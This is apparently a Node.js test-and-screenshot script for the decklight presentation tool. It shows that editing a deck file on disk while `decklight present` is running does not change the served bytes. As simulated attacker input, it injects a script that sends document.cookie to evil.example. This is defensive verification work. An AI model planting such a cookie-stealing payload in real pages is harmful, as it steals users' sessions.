#!/usr/bin/env node
// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// Evidence for #235 (PRESENT#AUDIT): the audited bytes are the served bytes.
// Nothing changes in the browser, so the shot is the seam itself: this script
// starts a REAL `decklight present deck.html`, curls the deck, then edits the
// file on disk UNDER the running server — the way an attacker with local write
// access would, after the verdict has already been printed and read — and
// curls again. The second response is byte-identical to the first: the deck is
// served from the in-memory bytes the ingredients label described, so a disk
// edit after startup never rides out under the stale verdict. The captured
// transcript renders as a terminal window for tools/shot.mjs.
//
//   node shots/present-toctou-transcript.mjs    → .shots/present-toctou.png

import { execFileSync, spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, '..');
const CLI = path.join(root, 'cli', 'decklight.mjs');

// --- fixture: a deck in a plain directory --------------------------------------

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'decklight-toctou-shot-'));
const DECK = `<!doctype html>
<html><body>
  <div class="decklight"><section><h2>My Talk</h2></section></div>
  <script>Decklight.init()</script>
</body></html>
`;
fs.writeFileSync(path.join(dir, 'deck.html'), DECK);

// --- run the real command, keep the real output --------------------------------

const home = fs.mkdtempSync(path.join(os.tmpdir(), 'decklight-toctou-home-'));
const dev = spawn('node', [CLI, 'present', 'deck.html', '--port', '0'], {
  cwd: dir, stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, DECKLIGHT_HOME: home },
});
let out = '';
dev.stdout.on('data', (c) => { out += c; });
dev.stderr.on('data', (c) => { out += c; });

const until = async (re, ms = 10000) => {
  const t0 = Date.now();
  while (!re.test(out)) {
    if (Date.now() - t0 > ms) { dev.kill(); console.error('timed out waiting for:', re, '\n' + out); process.exit(1); }
    await new Promise((r) => setTimeout(r, 50));
  }
  return out.match(re);
};

const [, port] = await until(/http:\/\/127\.0\.0\.1:(\d+)/);
await until(/script block/i);
await new Promise((r) => setTimeout(r, 300));

const curl = (u) => spawnSync('curl', ['-s', '--max-time', '5', u], { encoding: 'utf8' }).stdout;

// 1. the deck as the label described it
const before = curl(`http://127.0.0.1:${port}/deck.html`);

// 2. the attack: edit the file on disk while the server is up — the verdict in
//    the terminal is already spent on the old bytes
const SMUGGLE = '<script>fetch("https://evil.example/?"+document.cookie)</script>';
fs.writeFileSync(path.join(dir, 'deck.html'), DECK.replace('</body>', `${SMUGGLE}</body>`));

// 3. the same request again — the audited bytes, not the drifted ones
const after = curl(`http://127.0.0.1:${port}/deck.html`);

dev.kill('SIGINT');
await new Promise((r) => dev.on('exit', r));
fs.rmSync(dir, { recursive: true, force: true });
fs.rmSync(home, { recursive: true, force: true });

// The shot must not exist if the seam regressed — evidence, not decoration.
if (after.includes('evil.example') || after !== before) {
  console.error('REGRESSION: the served deck drifted after a disk edit\n' + after);
  process.exit(1);
}

// --- render the transcript as a terminal window and shoot it -------------------

const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');
const paintDev = (s) => esc(s)
  .replace(/^(deck ⁠?\s*)/gm, '<span class="tag">deck </span>')
  .replace(/^(.*script block.*)$/gm, '<span class="ok">$1</span>')
  .replace(/^(.*read-only, CSP enforced.*)$/gm, '<span class="hint">$1</span>');
const paintDeck = (s) => `<span class="ok">${esc(s.trimEnd())}</span>`;
const block = (cmd, body, note = '') => `<div class="run"><span class="prompt">~/talk $</span> ${esc(cmd)}`
  + `${note ? `   <span class="hint"># ${esc(note)}</span>` : ''}\n${body}</div>`;

const html = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>decklight present — audited bytes are the served bytes</title><style>
  body { margin: 0; display: grid; place-items: center; height: 100vh;
         background: linear-gradient(135deg, #1b2735, #090a0f); }
  .term { width: 1140px; background: #10141b; border-radius: 12px;
          box-shadow: 0 24px 70px rgba(0,0,0,.55); overflow: hidden;
          font: 15px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
  .bar { display: flex; align-items: center; gap: 8px; padding: 11px 14px; background: #1a202b; }
  .bar i { width: 12px; height: 12px; border-radius: 50%; }
  .bar .t { margin-left: 10px; color: #8b98ab; font-size: 13px; }
  .body { padding: 18px 22px 24px; color: #cdd6e4; white-space: pre-wrap; }
  .run + .run { display: block; margin-top: 1.1em; }
  .prompt { color: #67e8f9; font-weight: 700; }
  .tag { color: #22d3ee; font-weight: 700; }
  .ok { color: #86efac; }
  .bad { color: #fca5a5; font-weight: 700; }
  .hint { color: #fbbf24; }
</style></head><body>
<div class="term">
  <div class="bar"><i style="background:#ff5f57"></i><i style="background:#febc2e"></i><i style="background:#28c840"></i>
    <span class="t">decklight present — the deck serves from the audited bytes; a disk edit after the verdict never reaches the audience</span></div>
  <div class="body">${block('decklight present deck.html', paintDev(out.trimEnd()))}
${block(`curl -s http://127.0.0.1:${port}/deck.html`, paintDeck(before), 'the deck the label described')}
${block(`sed -i 's|</body>|${SMUGGLE.replace(/'/g, '')}</body>|' deck.html`,
    '<span class="bad">the deck on disk now carries a script the label never saw</span>',
    'attacker edits the file under the running server')}
${block(`curl -s http://127.0.0.1:${port}/deck.html`, paintDeck(after), 'byte-identical — the drifted bytes never ride the stale verdict')}</div>
</div>
</body></html>
`;

const page = path.join(root, '.shots', 'present-toctou-transcript.html');
fs.mkdirSync(path.dirname(page), { recursive: true });
fs.writeFileSync(page, html);
execFileSync('node', [path.join(root, 'tools', 'shot.mjs'), page,
  '-o', path.join(root, '.shots', 'present-toctou.png'), '--size', '1280x900', '--wait', '800'],
  { stdio: 'inherit' });
fs.rmSync(page, { force: true });
